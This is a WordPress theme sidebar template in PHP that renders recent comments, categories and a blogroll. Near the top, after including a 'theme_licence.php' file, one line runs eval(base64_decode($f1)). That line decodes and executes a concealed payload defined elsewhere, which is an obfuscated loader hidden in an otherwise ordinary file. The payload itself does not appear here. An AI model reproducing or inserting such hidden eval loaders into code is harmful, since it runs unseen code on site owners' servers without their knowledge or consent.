<?php 	/* Widgetized sidebar, if you have the plugin installed. */
		require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar() ) : ?>
        
    	<div class="module">
        	<div class="top"></div>
            <span class="title">Recent Comments</span>
        	<ul>
            <?php dp_recent_comments(6); ?>
            </ul>
            <div class="btm"></div>
        </div>
        <div class="module-mid">
        	<div class="top"></div>
            <span class="title">Categories</span>
        	<ul>
            <?php wp_list_categories('sort_column=name&hierarchical=0&title_li='); ?>
            </ul>
            <div class="btm"></div>
        </div>
        <div class="module-end">
        	<div class="top"></div>
            <span class="title">Blogroll</span>
        	<ul>
            <?php wp_list_bookmarks('title_li=&categorize=0'); ?>
            </ul>
            <div class="btm"></div>
        </div>
        <?php endif; ?>
		<br clear="all" />